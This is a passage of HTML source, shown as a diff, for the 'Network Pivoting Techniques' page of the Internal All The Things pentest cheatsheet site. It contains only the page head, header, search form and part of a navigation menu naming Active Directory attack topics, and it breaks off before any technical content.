@@ -1,0 +1,5632 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="Active Directory and Internal Pentest Cheatsheets">
+      
+      
+      
+        <link rel="canonical" href="https://swisskyrepo.github.io/InternalAllTheThings/redteam/pivoting/network-pivoting-techniques/">
+      
+      
+        <link rel="prev" href="../../persistence/windows-persistence/">
+      
+      
+      
+      <link rel="icon" href="../../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.6.8">
+    
+    
+      
+        <title>Network Pivoting Techniques - Internal All The Things</title>
+      
+    
+    
+	
+      <link rel="stylesheet" href="../../../assets/stylesheets/main.8608ea7d.min.css">
+      
+        
+        <link rel="stylesheet" href="../../../assets/stylesheets/palette.06af60db.min.css">
+      
+      
+
+
+    
+  <style>
+  .social-container {
+    float: right;
+  }
+  </style>
+
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../../../custom.css">
+    
+    <script>__md_scope=new URL("../../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+      
+        <meta  property="og:type"  content="website" >
+      
+        <meta  property="og:title"  content="Network Pivoting Techniques - Internal All The Things" >
+      
+        <meta  property="og:description"  content="Active Directory and Internal Pentest Cheatsheets" >
+      
+        <meta  property="og:image"  content="https://swisskyrepo.github.io/InternalAllTheThings/assets/images/social/redteam/pivoting/network-pivoting-techniques.png" >
+      
+        <meta  property="og:image:type"  content="image/png" >
+      
+        <meta  property="og:image:width"  content="1200" >
+      
+        <meta  property="og:image:height"  content="630" >
+      
+        <meta  property="og:url"  content="https://swisskyrepo.github.io/InternalAllTheThings/redteam/pivoting/network-pivoting-techniques/" >
+      
+        <meta  name="twitter:card"  content="summary_large_image" >
+      
+        <meta  name="twitter:title"  content="Network Pivoting Techniques - Internal All The Things" >
+      
+        <meta  name="twitter:description"  content="Active Directory and Internal Pentest Cheatsheets" >
+      
+        <meta  name="twitter:image"  content="https://swisskyrepo.github.io/InternalAllTheThings/assets/images/social/redteam/pivoting/network-pivoting-techniques.png" >
+      
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#network-pivoting-techniques" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../../.." title="Internal All The Things" class="md-header__button md-logo" aria-label="Internal All The Things" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            Internal All The Things
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Network Pivoting Techniques
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="(prefers-color-scheme: light)" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_0">
+    
+      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_1" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a4 4 0 0 0-4 4 4 4 0 0 0 4 4 4 4 0 0 0 4-4 4 4 0 0 0-4-4m0 10a6 6 0 0 1-6-6 6 6 0 0 1 6-6 6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="(prefers-color-scheme: dark)" data-md-color-scheme="slate" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_1">
+    
+      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_0" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 18c-.89 0-1.74-.2-2.5-.55C11.56 16.5 13 14.42 13 12s-1.44-4.5-3.5-5.45C10.26 6.2 11.11 6 12 6a6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg>
+      </label>
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      <label class="md-header__button md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+      </label>
+      <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+          <a href="javascript:void(0)" class="md-search__icon md-icon" title="Share" aria-label="Share" data-clipboard data-clipboard-text="" data-md-component="search-share" tabindex="-1">
+            
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7s-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9a3 3 0 0 0-3 3 3 3 0 0 0 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.15c-.05.21-.08.43-.08.66 0 1.61 1.31 2.91 2.92 2.91s2.92-1.3 2.92-2.91A2.92 2.92 0 0 0 18 16.08"/></svg>
+          </a>
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+        <div class="md-search__suggest" data-md-component="search-suggest"></div>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+    
+      <div class="md-header__source">
+        <a href="https://github.com/swisskyrepo/InternalAllTheThings" title="Go to repository" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><!--! Font Awesome Free 6.7.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8M97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"/></svg>
+  </div>
+  <div class="md-source__repository">
+    GitHub
+  </div>
+</a>
+      </div>
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../../.." title="Internal All The Things" class="md-nav__button md-logo" aria-label="Internal All The Things" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    Internal All The Things
+  </label>
+  
+    <div class="md-nav__source">
+      <a href="https://github.com/swisskyrepo/InternalAllTheThings" title="Go to repository" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><!--! Font Awesome Free 6.7.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8M97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"/></svg>
+  </div>
+  <div class="md-source__repository">
+    GitHub
+  </div>
+</a>
+    </div>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../.." class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Internal All The Things
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../DISCLAIMER/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    DISCLAIMER
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Active directory
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            Active directory
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../active-directory/ad-adcs-certificate-services/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Active Directory - Certificate Services
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../active-directory/ad-adds-acl-ace/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Active Directory - Access Controls ACL/ACE
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../active-directory/ad-adds-enumerate/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Active Directory - Enumeration
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../active-directory/ad-adds-group-policy-objects/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Active Directory - Group Policy Objects
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../active-directory/ad-adds-groups/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Active Directory - Groups
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../active-directory/ad-adds-linux/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Active Directory - Linux
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../active-directory/ad-adds-machineaccountquota/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Active Directory - Machine Account Quota
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../active-directory/ad-adds-ntds-dumping/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Active Directory - NTDS Dumping
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../active-directory/ad-adds-rodc/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Active Directory - Read Only Domain Controller
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../active-directory/ad-adfs-federation-services/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Active Directory - Federation Services
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../active-directory/ad-integrated-dns/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Active Directory - Integrated DNS - ADIDNS
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../active-directory/ad-roasting-asrep/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Roasting - ASREP Roasting
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../active-directory/ad-roasting-kerberoasting/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Roasting - Kerberoasting
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../active-directory/ad-roasting-timeroasting/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Roasting - Timeroasting
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../active-directory/ad-tricks/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Active Directory - Tricks
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../active-directory/deployment-sccm/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Deployment - SCCM
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../active-directory/deployment-wsus/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Deployment - WSUS
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../active-directory/hash-capture/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Hash - Capture and Cracking
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../active-directory/hash-over-pass-the-hash/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Hash - OverPass-the-Hash
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../active-directory/hash-pass-the-hash/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Hash - Pass the Hash
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../active-directory/hash-pass-the-key/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Hash - Pass The Key
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../active-directory/internal-dcom/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Internal - DCOM
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../active-directory/internal-pxe-boot-image/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Internal - PXE Boot Image
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../active-directory/internal-relay-kerberos/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Internal - Kerberos Relay
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../active-directory/internal-relay-ntlm/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Internal - NTLM Relay
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../active-directory/internal-shares/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Internal - Shares
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../active-directory/kerberos-bronze-bit/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Kerberos - Bronze Bit
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../active-directory/kerberos-delegation-constrained/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Kerberos Delegation - Constrained Delegation
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../active-directory/kerberos-delegation-rbcd/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Kerberos Delegation - Resource Based Constrained Delegation
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../active-directory/kerberos-delegation-unconstrained/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Kerberos Delegation - Unconstrained Delegation
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../active-directory/kerberos-s4u/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Kerberos - Service for User Extension
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../active-directory/kerberos-tickets/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Kerberos - Tickets
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../active-directory/pwd-comments/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Password - AD User Comment
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../active-directory/pwd-dsrm-credentials/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Password - DSRM Credentials
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../active-directory/pwd-group-policy-preferences/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Password - Group Policy Preferences
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../active-directory/pwd-precreated-computer/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Password - Pre-Created Computer Account
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../active-directory/pwd-read-gmsa/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Password - GMSA
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../active-directory/pwd-read-laps/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Password - LAPS
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../active-directory/pwd-shadow-credentials/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Password - Shadow Credentials
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../active-directory/pwd-spraying/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Password - Spraying
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../active-directory/trust-pam/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Trust - Privileged Access Management
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
